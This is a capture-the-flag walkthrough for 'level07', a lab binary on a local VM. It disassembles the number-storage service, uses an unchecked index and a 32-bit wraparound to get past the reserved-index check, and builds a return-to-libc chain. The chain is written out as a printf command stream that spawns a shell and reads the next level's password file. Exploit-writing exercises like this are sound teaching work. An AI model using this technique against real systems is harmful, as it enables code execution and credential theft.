# level07

For now, retrieve the `level07` binary from the VM.

## Connect to level07

Read the password obtained from level06:

```sh
cat level06/flag
```

Connect to the VM:

```sh
ssh level07@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level06/flag`.

## Get the binary

Copy the ELF binary from the VM:

```sh
scp -P 2222 level07@127.0.0.1:/home/users/level07/level07 ./level07/src/level07
```

Use the content of `level06/flag` as the password.

Verify the downloaded binary:

```sh
file level07/src/level07
```

The local binary should now be:

```text
level07/src/level07
```

## Save `main_dump_gdb`

Inside the level07 SSH session, load the binary using its absolute path:

```sh
gdb ./level07
```

Save the complete disassembly of `main` with a level-specific temporary filename:

```gdb
set disassembly-flavor intel
set logging file /tmp/level07_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify that the dump exists on the VM:

```sh
ls -l /tmp/level07_main_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level07@127.0.0.1:/tmp/level07_main_dump_gdb ./level07/src/main_dump_gdb
```

Use the content of `level06/flag` as the password.

The local files should now be:

```text
level07/src/level07
level07/src/main_dump_gdb
```

## Decode addresses from `main_dump_gdb`

Compile the shared decoder from the repository root if necessary:

```sh
gcc -Wall -Wextra -Werror decode_address.c -o decode_address
```

The data addresses used directly by `main` are:

```text
0x8048b38
0x8048d4b
0x8048d5b
0x8048d61
0x8048d66
0x8048d6b
0x8048d88
0x804a040
```

Decode them against the level07 binary:

```sh
./decode_address level07/src/level07 0x8048b38
./decode_address level07/src/level07 0x8048d4b
./decode_address level07/src/level07 0x8048d5b
./decode_address level07/src/level07 0x8048d61
./decode_address level07/src/level07 0x8048d66
./decode_address level07/src/level07 0x8048d6b
./decode_address level07/src/level07 0x8048d88
./decode_address level07/src/level07 0x804a040
```

The decoded values are:

```text
0x08048b38 -> welcome banner and command menu
0x08048d4b -> "Input command: "
0x08048d5b -> "store"
0x08048d61 -> "read"
0x08048d66 -> "quit"
0x08048d6b -> " Failed to do %s command\n"
0x08048d88 -> " Completed %s command successfully\n"
0x0804a040 -> zero-initialized BSS data (`stdin`), not a string
```

The long value at `0x08048b38` begins with:

```text
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
```

The code addresses below are functions and should not be decoded as strings:

```text
0x8048630 -> store_number
0x80486d7 -> read_number
```

`main` repeatedly reads one of three commands: `store`, `read`, or `quit`. The next analysis step is to save and inspect `store_number` and `read_number`.

## Save `store_number_dump_gdb`

Inside the level07 SSH session, load the binary:

```sh
gdb ./level07
```

Save the complete `store_number` disassembly:

```gdb
set disassembly-flavor intel
set logging file /tmp/level07_store_number_dump_gdb
set logging overwrite on
set logging on
disas store_number
set logging off
quit
```

Verify the file on the VM:

```sh
ls -l /tmp/level07_store_number_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level07@127.0.0.1:/tmp/level07_store_number_dump_gdb ./level07/src/store_number_dump_gdb
```

## Save `read_number_dump_gdb`

Start GDB again on the VM:

```sh
gdb ./level07
```

Save the complete `read_number` disassembly:

```gdb
set disassembly-flavor intel
set logging file /tmp/level07_read_number_dump_gdb
set logging overwrite on
set logging on
disas read_number
set logging off
quit
```

Verify and copy the file:

```sh
ls -l /tmp/level07_read_number_dump_gdb
```

From the repository root on the host:

```sh
scp -P 2222 level07@127.0.0.1:/tmp/level07_read_number_dump_gdb ./level07/src/read_number_dump_gdb
```

Use the content of `level06/flag` as the password for both SCP commands.

## Decode addresses from `store_number_dump_gdb`

The readable data addresses in `store_number` are:

```text
0x8048ad3
0x8048add
0x8048ae6
0x8048af8
```

Decode them from the repository root:

```sh
./decode_address level07/src/level07 0x8048ad3
./decode_address level07/src/level07 0x8048add
./decode_address level07/src/level07 0x8048ae6
./decode_address level07/src/level07 0x8048af8
```

The output is:

```text
0x08048ad3 -> " Number: "
0x08048add -> " Index: "
0x08048ae6 -> " *** ERROR! ***"
0x08048af8 -> "   This index is reserved for wil!"
```

The value `0xaaaaaaab` is not an address. It is a compiler-generated multiplication constant used to calculate whether the entered index is divisible by three.

The function rejects a store when either condition is true:

```c
index % 3 == 0
(number >> 24) == 0xb7
```

If both checks pass, it writes the number using:

```c
storage[index] = number;
```

No upper bound is checked for `index`, which is important for the next analysis step.

## Decode addresses from `read_number_dump_gdb`

`read_number` contains two readable data addresses:

```text
0x8048add
0x8048b1b
```

Decode them from the repository root:

```sh
./decode_address level07/src/level07 0x8048add
./decode_address level07/src/level07 0x8048b1b
```

The output is:

```text
0x08048add -> " Index: "
0x08048b1b -> " Number at data[%u] is %u\n"
```

The function reads the entered index, multiplies it by four, adds it to the storage-array address, and prints the value found there:

```c
printf(" Number at data[%u] is %u\n", index, storage[index]);
```

Unlike `store_number`, `read_number` performs no reserved-index check and no upper-bound check. It can therefore read a 32-bit value outside the intended storage array.

## Locate the saved return address

The storage array starts at `[esp+0x24]`. When `main` finishes, its saved return address is read from `[ebp+0x4]`.

Confirm the distance in GDB on the level07 VM:

```sh
gdb ./level07
```

Set a breakpoint at the `quit` branch near the end of `main`:

```gdb
set pagination off
break *0x080489cf
run
```

At the program prompt, enter:

```text
quit
```

When the breakpoint is reached, calculate the array index of the saved return address:

```gdb
p/x $esp+0x24
p/x $ebp+0x4
p/d (($ebp+4)-($esp+0x24))/4
```

The expected index is:

```text
114
```

This means `storage[114]` overlaps the saved return address of `main`.

## Bypass the reserved index

`store_number` rejects indexes divisible by three, and `114 % 3 == 0`, so index 114 cannot be written directly.

The destination calculation uses 32-bit arithmetic:

```c
address = storage + index * 4;
```

Add `2^30` to the index. Multiplication by four then adds `2^32`, which wraps to zero in a 32-bit register:

```text
2^30 + 114 = 1073741938

(1073741938 * 4) modulo 2^32 = 456
114 * 4                         = 456
```

Both indexes therefore reach the same memory address, but the wrapped index passes the reserved-index check:

```text
1073741938 % 3 = 1
```

Use this wrapped index when overwriting the saved return address. The following stack words are reached normally with indexes 115 and 116.

## Find the return-to-libc addresses

The return-address index is confirmed as 114. The final stack layout will be:

```text
index 114 -> system address
index 115 -> exit address used after system returns
index 116 -> address of the "/bin/sh" string
```

Use the wrapped index `1073741938` instead of 114 for the first write.

While the program is stopped at the GDB breakpoint and libc is loaded, print the function addresses:

```gdb
p/x (void *)system
p/x (void *)exit
info proc mappings
```

In the output of `info proc mappings`, find every row ending with:

```text
/lib32/libc-2.15.so
```

Use the start address from the first libc row as `LIBC_START`. Use the end address from the last libc row as `LIBC_END`.

On this VM, the expected complete range is:

```text
LIBC_START = 0xf7e2c000
LIBC_END   = 0xf7fd0000
```

Verify these values against the current GDB output, then search that range:

```gdb
find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
```

GDB returns:

```text
0xf7f897ec
1 pattern found.
```

Therefore:

```text
"/bin/sh" = 0xf7f897ec
```

Record the addresses of:

```text
system
exit
"/bin/sh"
```

Because `get_unum` reads unsigned decimal values, these hexadecimal addresses must then be converted to unsigned decimal before entering them with the `store` command.

For this VM run, the confirmed addresses are:

```text
system     = 0xf7e6aed0
exit       = 0xf7e5eb70
"/bin/sh" = 0xf7f897ec
```

Convert them to unsigned decimal in the VM shell:

```sh
printf '%u\n' $((0xf7e6aed0))
printf '%u\n' $((0xf7e5eb70))
printf '%u\n' $((0xf7f897ec))
```

The decimal values are:

```text
system     = 4159090384
exit       = 4159040368
"/bin/sh" = 4160264172
```

## Build the return-to-libc chain

Write the three values into the stack slots identified earlier:

```text
Number 4159090384 at wrapped index 1073741938 -> system
Number 4159040368 at index 115                -> exit
Number 4160264172 at index 116                -> "/bin/sh"
```

Run the complete command stream on the level07 VM:

```sh
(
    printf 'store\n4159090384\n1073741938\n'
    printf 'store\n4159040368\n115\n'
    printf 'store\n4160264172\n116\n'
    printf 'quit\n'
    cat
) | /home/users/level07/level07
```

When `main` returns, execution continues as:

```c
system("/bin/sh");
exit(...);
```

The shell reads from a pipe and may not display a prompt. Type commands even if no prompt is visible:

```sh
whoami
cat /home/users/level08/.pass
```

## Save the flag

Back on the host, store the password displayed by `/home/users/level08/.pass` in:

```text
level07/flag
```

Verify it with:

```sh
cat level07/flag
```

## Connect to level08

Use the content of `level07/flag` as the SSH password:

```sh
ssh level08@127.0.0.1 -p 2222
```
